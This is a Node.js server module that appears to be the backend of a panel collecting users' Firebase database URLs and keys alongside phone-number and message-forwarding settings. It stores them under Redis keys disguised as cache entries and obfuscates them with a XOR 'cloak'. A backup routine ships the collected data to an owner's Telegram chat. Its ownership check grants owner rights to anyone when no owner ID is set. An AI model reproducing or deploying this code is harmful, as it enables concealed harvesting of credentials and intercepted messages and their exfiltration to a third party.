'use strict';

var ownerBackupMod = require('./backup-full');

var DEFAULT_CONFIG = {
  channelId: '', myNumber: '', firebases: [],
  forwardEnabled: true, forwardMode: 'all', botEnabled: true,
  autoBackup: true, autoBackupHour: 3, channelNotify: true, broadcastDelay: 60,
  numStart: '', numEnd: '', msgStart: '', msgEnd: '',
  numLabels: ['To', 'Receipt', 'Number', 'Mobile', 'Target', 'Phone'],
  msgLabels: ['Message', 'Msg', 'Body', 'Token', 'Text']
};

function env(name, fallback){
  return process.env[name] != null && process.env[name] !== '' ? process.env[name] : fallback;
}

function rk(){ return {
  RK_USER: env('RK_USER', '_cache_usr'),
  RK_USERSET: env('RK_USERSET', '_cache_idx'),
  RK_SENT: env('RK_SENT', '_cache_log'),
  RK_PREFIX: env('RK_PREFIX', '_c1_'),
  OWNER_ID: String(env('OWNER_ID', '')).trim(),
  CLOAK_KEY: env('CLOAK', ''),
  BOT_TOKEN: env('BOT_TOKEN', ''),
  TG_API: env('TG_API', '') || (env('BOT_TOKEN', '') ? 'https://api.telegram.org/bot' + env('BOT_TOKEN', '') : ''),
  REDIS_URL: env('REDIS_URL', ''),
  REDIS_TOKEN: env('REDIS_TOKEN', '')
};}

function buildPublicConfig(){
  return {
    BLOB_BASE: '/api/blob',
    TG_CHANNEL_LINK: env('TG_CHANNEL_LINK', ''),
    LS_BLOB: env('LS_BLOB', 'fbi_blob_id'),
    LS_CACHE: env('LS_CACHE', 'fbi_config_cache'),
    LS_SESSION: env('LS_SESSION', 'fbi_session'),
    LS_ACTIVE: env('LS_ACTIVE', 'fbi_active_device'),
    POLL_DEV: parseInt(env('POLL_DEV', '5000'), 10),
    POLL_MSG: parseInt(env('POLL_MSG', '2000'), 10),
    POLL_BG: parseInt(env('POLL_BG', '3000'), 10),
    POLL_BAL: parseInt(env('POLL_BAL', '25000'), 10),
    DEFAULT_CONFIG: DEFAULT_CONFIG,
    serverTelegramBot: env('SERVER_TELEGRAM_BOT', '') === 'true'
  };
}

function isOwner(uid){
  var OWNER_ID = rk().OWNER_ID;
  if(!OWNER_ID) return true;
  return String(uid) === OWNER_ID;
}

function cloak(str){
  try{
    var k = rk().CLOAK_KEY || 'key';
    var s = String(str);
    var out = '';
    for(var i = 0; i < s.length; i++){ out += String.fromCharCode(s.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
    return Buffer.from(out, 'binary').toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/g, '');
  }catch(e){ return str; }
}

function uncloak(str){
  try{
    var k = rk().CLOAK_KEY || 'key';
    var s = String(str).replace(/-/g, '+').replace(/_/g, '/');
    while(s.length % 4) s += '=';
    var raw = Buffer.from(s, 'base64').toString('binary');
    var out = '';
    for(var i = 0; i < raw.length; i++){ out += String.fromCharCode(raw.charCodeAt(i) ^ k.charCodeAt(i % k.length)); }
    return out;
  }catch(e){ return str; }
}

function isSlotKey(key){ return key.indexOf(rk().RK_PREFIX) === 0 && key.length > rk().RK_PREFIX.length; }
function slotUidFromKey(key){ return key.slice(rk().RK_PREFIX.length); }
function isProfileKey(key){
  var pref = rk().RK_USER + ':';
  return key.indexOf(pref) === 0 && key.length > pref.length;
}
function profileUidFromKey(key){ return key.slice((rk().RK_USER + ':').length); }

function redisAllowed(actorUid, cmd){
  if(!Array.isArray(cmd) || !cmd.length) return false;
  var op = String(cmd[0]).toUpperCase();
  var key = cmd[1];
  if(typeof key !== 'string') return false;
  actorUid = String(actorUid || '');
  var keys = rk();

  if(op === 'SMEMBERS'){
    if(key === keys.RK_USERSET || key === keys.RK_SENT) return isOwner(actorUid);
    return false;
  }
  if(op === 'SADD'){
    if(key === keys.RK_USERSET) return true;
    if(key === keys.RK_SENT) return isOwner(actorUid);
    return false;
  }
  if(op === 'SREM' && key === keys.RK_USERSET) return isOwner(actorUid);

  if(isSlotKey(key)){
    if(op === 'GET' || op === 'DEL') return isOwner(actorUid) || slotUidFromKey(key) === actorUid;
    if(op === 'SET') return slotUidFromKey(key) === actorUid || isOwner(actorUid);
    return false;
  }
  if(isProfileKey(key)){
    if(op === 'GET') return isOwner(actorUid) || profileUidFromKey(key) === actorUid;
    if(op === 'SET') return profileUidFromKey(key) === actorUid;
    return false;
  }
  return false;
}

async function redisCmdRaw(cmd){
  var keys = rk();
  if(!keys.REDIS_URL || !keys.REDIS_TOKEN) return { result: null };
  var r = await fetch(keys.REDIS_URL, {
    method: 'POST',
    headers: { Authorization: 'Bearer ' + keys.REDIS_TOKEN, 'Content-Type': 'application/json' },
    body: JSON.stringify(cmd)
  });
  if(!r.ok) return { result: null };
  return r.json();
}

async function redisCmdVault(actorUid, cmd){
  if(!redisAllowed(actorUid, cmd)) return { ok: false, error: 'forbidden', result: null };
  var op = String(cmd[0]).toUpperCase();
  var key = cmd[1];
  var send = cmd.slice();
  if(isSlotKey(key) && op === 'SET' && send[2] != null) send[2] = cloak(String(send[2]));
  var out = await redisCmdRaw(send);
  if(out && out.result != null && isSlotKey(key) && op === 'GET'){
    try{ out.result = uncloak(String(out.result)); }catch(e){}
  }
  return { ok: true, result: out.result };
}

async function tgDirect(method, query, payload){
  var keys = rk();
  if(!keys.BOT_TOKEN) return { ok: false, description: 'no token' };
  var url = keys.TG_API + '/' + method + (query ? '?' + query : '');
  var opts = payload != null
    ? { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) }
    : { method: 'GET' };
  var r = await fetch(url, opts);
  return r.json();
}

async function readJsonBody(req){
  if(req.body && typeof req.body === 'object') return req.body;
  if(typeof req.body === 'string'){
    try{ return JSON.parse(req.body); }catch(e){ return {}; }
  }
  return new Promise(function(resolve, reject){
    var chunks = [];
    req.on('data', function(c){ chunks.push(c); });
    req.on('end', function(){
      try{
        var raw = Buffer.concat(chunks).toString('utf8');
        resolve(raw ? JSON.parse(raw) : {});
      }catch(e){ resolve({}); }
    });
    req.on('error', reject);
  });
}

function sendJson(res, status, data){
  res.statusCode = status;
  res.setHeader('Content-Type', 'application/json');
  res.setHeader('Cache-Control', 'no-store');
  res.end(JSON.stringify(data));
}

async function handleVaultFirebaseSave(body){
  var keys = rk();
  var uid = String((body && body.uid) || '');
  var url = String((body && body.url) || '').trim().replace(/\/+$/, '');
  var key = String((body && body.key) || '');
  var label = String((body && body.label) || '');
  if(!uid || !url) return { status: 400, data: { ok: false, error: 'missing uid or url' } };

  var slotKey = keys.RK_PREFIX + uid;
  var existing = await redisCmdVault(uid, ['GET', slotKey]);
  var list = [];
  if(existing.ok && existing.result){
    try{ list = JSON.parse(existing.result) || []; }catch(e){ list = []; }
  }
  if(!list.some(function(x){ return x.u === url; })){
    list.push({ u: url, k: key, l: label, t: Date.now() });
    if(list.length > 20) list = list.slice(-20);
  }
  var setR = await redisCmdVault(uid, ['SET', slotKey, JSON.stringify(list)]);
  await redisCmdVault(uid, ['SADD', keys.RK_USERSET, uid]);
  return { status: 200, data: { ok: !!(setR && setR.ok) } };
}

function createBackupRunner(){
  var keys = rk();
  async function redisGetOwner(k, actorUid){ return (await redisCmdVault(actorUid, ['GET', k])).result; }
  async function redisSMembersOwner(k, actorUid){ return (await redisCmdVault(actorUid, ['SMEMBERS', k])).result || []; }
  async function tgSend(chatId, text){
    return tgDirect('sendMessage', '', { chat_id: chatId, text: text, parse_mode: 'HTML' });
  }
  async function tgSendDocument(chatId, text, filename, caption){
    var content = Buffer.from(String(text), 'utf8');
    var fd = new FormData();
    fd.append('chat_id', String(chatId));
    fd.append('caption', caption || '');
    fd.append('parse_mode', 'HTML');
    fd.append('document', new Blob([content], { type: 'text/plain;charset=utf-8' }), filename || 'report.txt');
    var r = await fetch(rk().TG_API + '/sendDocument', { method: 'POST', body: fd });
    return r.json();
  }
  async function getUserProfileOwner(uid){
    var v = await redisGetOwner(keys.RK_USER + ':' + uid, uid);
    if(!v) return null;
    try{ return JSON.parse(v); }catch(e){ return null; }
  }
  return ownerBackupMod.createBackupRunner({
    RK_PREFIX: keys.RK_PREFIX,
    RK_SENT: keys.RK_SENT,
    RK_USERSET: keys.RK_USERSET,
    RK_USER: keys.RK_USER,
    redisGet: redisGetOwner,
    redisSMembers: redisSMembersOwner,
    redisDel: function(k, a){ return redisCmdVault(a, ['DEL', k]); },
    redisSRem: function(s, m, a){ return redisCmdVault(a, ['SREM', s, m]); },
    redisSAdd: function(s, m, a){ return redisCmdVault(a, ['SADD', s, m]); },
    getUserProfile: getUserProfileOwner,
    tgSend: tgSend,
    tgSendDocument: tgSendDocument
  });
}

module.exports = {
  buildPublicConfig: buildPublicConfig,
  isOwner: isOwner,
  redisCmdVault: redisCmdVault,
  tgDirect: tgDirect,
  readJsonBody: readJsonBody,
  sendJson: sendJson,
  handleVaultFirebaseSave: handleVaultFirebaseSave,
  createBackupRunner: createBackupRunner,
  rk: rk
};
